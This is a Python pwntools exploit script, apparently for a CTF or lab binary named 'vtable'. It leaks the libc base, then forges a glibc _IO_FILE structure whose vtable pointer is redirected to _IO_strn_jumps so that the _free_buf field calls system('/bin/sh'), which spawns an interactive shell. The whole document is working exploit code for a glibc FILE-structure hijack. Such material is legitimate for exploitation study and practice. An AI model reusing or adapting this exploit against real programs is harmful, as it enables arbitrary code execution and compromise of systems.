# gcc vtable.c -o vtable -ggdb -no-pie -ldl
# https://xz.aliyun.com/t/5579

from pwn import *

context.arch = 'amd64'

elf = ELF('./vtable')
libc = ELF('./libc.so.6')

r = process('./vtable')


buf = elf.symbols['buf']
bss = elf.bss()

print "buf @ ", hex(buf) 


r.recvuntil('@ ')
libc_base = int(r.recvline().strip(), 16) - libc.symbols['_IO_list_all']
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)


vtable1 = libc_base + 0x3e7fa0          # _IO_strn_jumps
vtable2 = libc_base + 0x3e8360          # _IO_str_jumps
vtable3 = libc_base + 0x3e8420          # _IO_str_chk_jumps
sh = libc.search('/bin/sh').next() + libc_base
# gef> p *(_IO_strfile *)buf
''' old pwntools version
fd = fit({
	   0x28: flat(1), # _IO_write_ptr
	   0x38: flat(sh), # _IO_buf_base
	   0x90: flat(bss), # lock
	   0xd8: flat(vtable-8),
	   0xe8: flat(system) # _free_buf
	}, filler='\0')
'''

fd = fit({
	   0x28: flat(1), # _IO_write_ptr
	   0x38: flat(sh), # _IO_buf_base
	   0x88: flat(bss), # lock
	   0xd8: flat(vtable1-8),
	   0xe8: flat(system) # _free_buf
	},filler=(ord('\x00'),))


r.sendlineafter('buf:', fd)
gdb.attach(r, 'b _IO_flush_all_lockp\nc\nn 16')
r.sendlineafter('addr:', p64(buf))

r.interactive()